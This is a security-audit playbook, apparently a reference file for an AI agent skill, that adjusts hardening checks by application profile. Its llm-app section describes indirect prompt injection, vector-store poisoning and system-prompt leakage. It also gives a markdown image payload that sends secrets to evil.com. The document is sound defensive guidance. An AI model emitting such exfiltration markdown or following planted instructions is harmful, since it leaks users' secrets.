# Profile Playbooks

Profile-specific adjustments to the core seven categories. Load this when the application's profile demands coverage that differs from the default network-service assumptions in SKILL.md.

The key insight: **hardening has diminishing and sometimes inverting returns depending on context.** A circuit breaker in a single-user CLI tool is noise. A lack of TLS in a library that makes no network calls is not a finding. Match recommendations to the profile.

## Contents

- Desktop GUI applications
- CLI tools
- Network services (HTTP APIs, gRPC, RPC servers)
- Background workers / queue consumers
- Libraries
- Embedded / IoT
- Sub-profiles: `containerized`, `llm-app`
- Multi-profile / blended applications
- Monorepo / multiple deployables
- Exposure tier multiplier
- Proportionality rules

---

## Desktop GUI applications

### Threat model
- Attacker usually cannot reach the process over the network
- Physical access and local malware are the primary concerns
- Other users on the same machine may be hostile (shared hosts, lab machines)
- The user themselves is *trusted* but can make mistakes (wrong file, power loss)

### What to emphasize

1. **Any network listener is suspicious.** Electron and Tauri apps frequently open local websockets (devtools, IPC, hot-reload). If one exists in a release build, that's P0 — a malicious local process or web page can exploit DNS rebinding to reach `127.0.0.1:<port>` via the user's browser. Verify the port binds only to localhost **and** uses origin/Host checks.
2. **Log rotation and disk impact.** A desktop user has 256GB, not a 4TB server. A log file that grows 100MB/day is catastrophic here. Cap logs at tens of MB, rotate aggressively.
3. **Crash recovery.** Desktop users lose work when the app crashes. Autosave, journal-based recovery, atomic writes for user files.
4. **Secret storage.** Config-file secrets are indefensible on desktop. Use the OS keychain. Electron: `node-keytar` or `safeStorage`. Tauri: `tauri-plugin-stronghold` or OS keychain.
5. **Update integrity.** Signed updates over HTTPS, with signature verification before apply. Sparkle on macOS, Squirrel/WinSparkle on Windows, auto-update frameworks for Electron/Tauri.
6. **File permissions on install directory.** World-writable install directories are a privilege escalation vector.
7. **User-content trust boundaries.** A file the user opens can still be malicious — the user was tricked into opening it. Validate file formats, sandbox parsers, cap sizes.
8. **Third-party web content** (Electron/Tauri): CSP headers, `nodeIntegration: false`, `contextIsolation: true`, `sandbox: true`. Any loaded remote content without CSP is P0.

### What to de-emphasize
- Rate limiting: unless the app exposes a local API to other apps, irrelevant
- Horizontal access control: single-user
- DoS protection: user is the only client
- TLS server config: the app is a client, not a server
- Multi-tenancy concerns: irrelevant

---

## CLI tools

### Threat model
- Short-lived, invoked explicitly
- Arguments and env vars may come from hostile sources (CI, scripts, shared build machines)
- Output goes to stdout/stderr which may be captured, logged, piped

### What to emphasize

1. **Input validation for argv, stdin, env vars.** In CI, these can come from untrusted PR content. Validate paths (no `..`), validate env vars, reject suspicious argv.
2. **Tempfile handling.** Use secure tempfile APIs with `O_EXCL` or equivalent. Clean up on all exit paths including signals. Never put secrets in tempfile paths.
3. **Exit codes.** Distinct codes for distinct failure modes. Scripts depend on this.
4. **Signal handling.** Clean up on SIGINT/SIGTERM. Don't leave tempfiles, locks, or partial output.
5. **Secrets on the command line.** `ps` exposes argv to other users on the host. Take secrets via stdin, env var, or a file, never as a command-line argument.
6. **Output hygiene.** `--verbose` should not dump env vars, auth headers, or raw request bodies. Desktop users pipe output to pastebins for help.

### What to de-emphasize
- Listeners, ports, TLS (there aren't any)
- Graceful shutdown beyond cleanup (process is short-lived)
- Rate limiting, circuit breakers (one-shot)

---

## Network services (HTTP APIs, gRPC, RPC servers)

This is the default assumption in SKILL.md. The full seven-category audit applies. Additional items worth emphasizing:

1. **Every handler has a timeout.** Server-level read/write/idle timeouts + per-request deadline propagation.
2. **Per-endpoint concurrency caps.** An expensive endpoint should not be able to exhaust all workers.
3. **Rate limiting is mandatory**, at minimum on login, signup, password reset, and any endpoint that fans out to expensive work.
4. **Health vs readiness.** Distinct endpoints. Readiness considers dependencies (DB, cache, downstream services). Liveness only considers "is the process alive and not deadlocked".
5. **Graceful shutdown with drain.** See SKILL.md category 6.
6. **Structured access logs with request IDs.** For forensics after an incident.
7. **Authentication at the edge + authorization per-resource.** Many services get auth right and authz wrong. Every resource access needs an ownership check.
8. **Observability minimums.** If you can't see latency percentiles and error rates per endpoint, you will miss incidents. Worth flagging their absence as a P2.

---

## Background workers / queue consumers

### Threat model
- Not directly exposed, but consume potentially untrusted messages
- A single poison message can take down the whole pool if not handled
- Silent failures lose work rather than crash loudly

### What to emphasize

1. **Idempotency.** Every handler should be safe to run twice. At-least-once delivery is the default in every reasonable queue.
2. **Poison-message quarantine.** After N retries, move to a DLQ. Never retry forever.
3. **Bounded concurrency per message type.** One expensive message type shouldn't starve the rest.
4. **Ack discipline.** Ack after commit, not before. A crash between "ack" and "commit" loses the message.
5. **Backpressure.** If the downstream is slow, slow the consumer. Don't buffer in memory.
6. **Observability.** Queue depth, message age, retry counts, DLQ depth — all need dashboards.
7. **Input validation.** Messages are untrusted even from internal sources. Validate before processing.

### What to de-emphasize
- TLS server config (no listener)
- Rate limiting on inbound (it's a queue)
- User-facing auth (internal)

---

## Libraries

### Threat model
- Consumed by other people's code
- Has no runtime of its own
- Surprises become footguns for consumers

### What to emphasize

1. **No side effects on import.** Spawning threads, opening files, making network calls, or creating tempfiles during import is a finding.
2. **Bounded resource use in public APIs.** Every method should have a documented upper bound on memory, time, file descriptors.
3. **Safe defaults.** Methods that take security-relevant options (TLS verify, XML external entities, timeouts) should default to the safe option.
4. **No global mutation.** Modifying process-wide state (signal handlers, locale, working directory, logger config) is a finding unless it's the library's entire purpose.
5. **Dependency discipline.** Every dependency is a supply chain risk for every consumer. Minimize, pin, audit.
6. **No hidden network access.** If the library makes network calls, it must be documented and disableable.

### What to de-emphasize
- Listeners, TLS, rate limiting, auth, graceful shutdown (these are the consumer's problem)
- Update integrity (the consumer distributes)

---

## Embedded / IoT

### Threat model
- Physically accessible by end users and attackers
- Remote, hard to update, long-lived
- Constrained resources (memory, storage, compute)
- Often runs as root because it's simpler
- Network connectivity may be intermittent

### What to emphasize

1. **Watchdog.** Hardware or OS watchdog that resets the device on hang. Critical because field debugging is impossible.
2. **Signed firmware and bootloader.** Secure boot chain. Unsigned updates = P0.
3. **Rollback on failed update.** If an update bricks the device, recovery partition must restore the previous known-good.
4. **Log rotation is survival.** Flash wear is real. Log to RAM or rotate aggressively. A runaway log on flash destroys the device.
5. **Resource ceilings are absolute.** A memory leak on a 64MB device is a crash within hours.
6. **Offline resilience.** Must work when disconnected. Queue telemetry, retry with exponential backoff + jitter over days.
7. **Privilege dropping.** Even if the app runs as root initially, drop privileges after binding low ports.
8. **Field debugging safety.** Debug endpoints and UART consoles should be disabled or auth-gated in production firmware.

### What to de-emphasize
- Complex rate limiting (usually the upstream service handles this)
- Multi-tenancy

---

## Sub-profiles that compose with any base profile

Base profiles (desktop-gui, cli, network-service, etc.) describe *what the app is*. Sub-profiles describe *how it's deployed or what it integrates with*, and add additional checks on top of the base.

### `containerized` sub-profile

Applies whenever the application ships as an OCI image (Dockerfile present, K8s manifests, ECS/Cloud Run/Fly config). Additional audit items:

- **Dockerfile hygiene**: non-root `USER`, no `:latest` base, pinned digests, minimal base (distroless / alpine / scratch when feasible), multi-stage build so build tools don't end up in the runtime image, no `ADD http://...`, no `curl | sh` without hash verification, `.dockerignore` present and excluding `.git`, `.env`, node_modules.
- **Secrets not baked into layers**: check with `docker history <image>`, `dive`, or `trivy`. A `COPY .env` or `ARG SECRET=` followed by use in a later layer leaks through image history even if deleted.
- **Runtime flags**: `--privileged` is P0. `--cap-add` must be minimal. `--security-opt no-new-privileges`. Read-only rootfs with explicit tmpfs writable mounts.
- **Orchestrator config**: resource limits (CPU, memory) set at the orchestrator level, not just inside the app. `securityContext` with `runAsNonRoot: true`, `readOnlyRootFilesystem: true`, `allowPrivilegeEscalation: false`, dropped capabilities.
- **`HEALTHCHECK`** defined in Dockerfile or equivalent orchestrator probe — without it, a deadlocked app stays "running".
- **Image scanning in CI**: trivy / grype / snyk container. Missing = P2 finding in its own right.

### `llm-app` sub-profile

Applies whenever the application calls a third-party LLM API (OpenAI, Anthropic, Gemini, local model server) or uses tool-use / function-calling. Modern top-10 material — do not skip. Additional audit items:

Anchored to **OWASP Top 10 for LLM Applications 2025** (https://owasp.org/www-project-top-10-for-large-language-model-applications/) — reference the LLMxx tags below when producing compliance-flavored reports.

- **Prompt injection via tool-returned content** *(LLM01)*: content retrieved by a tool call (web fetch, DB query, file read, search result) is *untrusted input to the model*. Treat tool outputs with the same suspicion as HTTP request bodies. Indirect prompt injection — attacker plants instructions in a document the model later retrieves — is the dominant variant in 2025 deployments.
- **Unsanitized model output fed into `exec` / SQL / shell / `eval`**: if the model emits code or commands and the application runs them without validation, it's RCE-by-LLM. Parse into a typed schema before use. Never eval model output.
- **Unbounded token / cost fan-out** *(LLM10 Unbounded Consumption)*: user-controlled prompt length, retrieval fan-out, tool-call loops without a max-iteration cap, no per-user cost quota. A single abusive user can cost you thousands of dollars in hours.
- **Retrieval of untrusted documents into context**: RAG over user-uploaded or web-scraped content lets attackers plant injection payloads in the corpus that activate when retrieved. Separate trust tiers for retrieved content.
- **Excessive Agency** *(LLM06)*: tool-call allowlists, scoped permissions, human-in-the-loop on destructive actions. Models should only be able to invoke tools they need for the current session, with the minimum permissions those tools require, and irreversible operations should require explicit user confirmation. "All tools available with full privileges" is a finding.
- **Output schema validation**: require structured output (JSON schema / tool-use) and validate before consuming. Free-text model output should never drive control flow.
- **Markdown / link auto-render** in chat UIs: auto-rendered images / links in untrusted model output → zero-click data exfiltration (attacker instructs model to render `![x](https://evil.com/?data=<secrets>)`). Sanitize markdown before render, disable auto-image-loading for model output, or use a CSP that blocks external origins from model-rendered content.
- **System Prompt Leakage** *(LLM07, new in 2025)*: system prompts often contain tool capability lists, business rules, role configuration, or even credentials that leak through crafted user inputs. Treat the system prompt as untrusted-readable: do not embed secrets in it, do not put authorization logic there, and assume any "hidden" instructions can be elicited and shown to a user. Test this explicitly during the audit.
- **Vector and Embedding Weaknesses** *(LLM08, new in 2025)*: RAG-specific risks beyond retrieval injection. Watch for vector store poisoning (attacker writes adversarial documents into a shared corpus), embedding inversion (recovering source text from stored embeddings — sensitive PII in the corpus is recoverable), cross-tenant embedding contamination (per-tenant isolation missing in the vector store), and unauthenticated access to the vector index itself.
- **Secret exposure through prompt history**: conversation history logged with API keys, user PII, or session tokens embedded. Apply the same redaction at the logger as for HTTP logs.
- **Model provider lock-in and failover**: treat the LLM API like any other downstream — timeouts, retries with classification, circuit breaker, bulkhead.

## Multi-profile / blended applications

Many real applications blend profiles. Examples:
- **Desktop GUI with a local HTTP server** (hot reload, IPC, extension APIs): audit as both `desktop-gui` and `network-service`, with extra emphasis on localhost binding and origin checks.
- **CLI tool with a persistent daemon mode** (e.g., `docker`, `cargo watch`): audit the one-shot CLI paths and the daemon mode separately — they have different threat models.
- **Network service with embedded worker pool**: the HTTP frontend is `network-service`; the worker is `background-worker`. Audit both.
- **Electron app that loads remote web content**: `desktop-gui` + extra web-security category (CSP, sandbox, node integration, preload scripts).

When auditing a blend, state both profiles in the report and organize findings so the reader can see which profile a finding comes from.

## Monorepo / multiple deployables

If the scope contains more than one independently-deployable application (monorepo with several services, or a frontend + backend + worker trio), each gets its own audit:

- Detect the boundaries: separate `package.json`/`pyproject.toml`/`go.mod` files, separate Dockerfiles, separate deploy configs.
- Produce **one report per deployable**, each with its own profile classification.
- Add a top-level index listing the deployables, their profiles, and a one-line severity summary.
- Shared libraries in the monorepo that feed multiple deployables should be audited once under the `library` profile and referenced from each affected report.
- Do not blend findings across deployables in a single list — it hides which system is actually at risk and slows triage.

## Exposure tier multiplier (apply at severity-assignment time)

The same technical finding has very different stakes depending on who can reach it:

| Exposure | Multiplier | Example |
|---|---|---|
| Public internet | ×1.0 (baseline) | Anyone with a URL |
| Internal LAN / VPC / corporate network | ×0.5 (drop one tier) | Requires a foothold first |
| Localhost / single-machine only | ×0.25 (drop two tiers) | Requires code execution on the host already |

A missing HTTP client timeout: P0 on a public API (single slow downstream → global hang, trivially exploitable), P1 on an internal microservice (still bad but attacker needs the internal network), P2 on a desktop CLI (user is already the only client).

Apply the multiplier **after** you've identified the finding technically, **before** you write the severity tag. This is the single highest-leverage calibration lever in the skill.

---

## Proportionality rules

Use these to sanity-check each finding before including it:

1. **Would this matter if the app crashed?** A finding that only matters when the process is compromised is lower severity than one that causes the compromise.
2. **Does the profile exclude this?** A "missing rate limit" on a single-user desktop tool is not a finding. Delete it.
3. **Is the cost of the fix bigger than the blast radius?** A P3 finding that requires rewriting a subsystem is probably actually a P4 (won't-fix).
4. **Is this one finding or a pattern?** If you find five instances of the same issue, report the pattern once with all five locations, not five separate findings.
5. **Would a competent senior engineer agree this matters?** If you're struggling to justify a finding, it's probably not a finding. Don't pad.

A tight report with 4 real findings beats a padded report with 20 speculative ones every time.
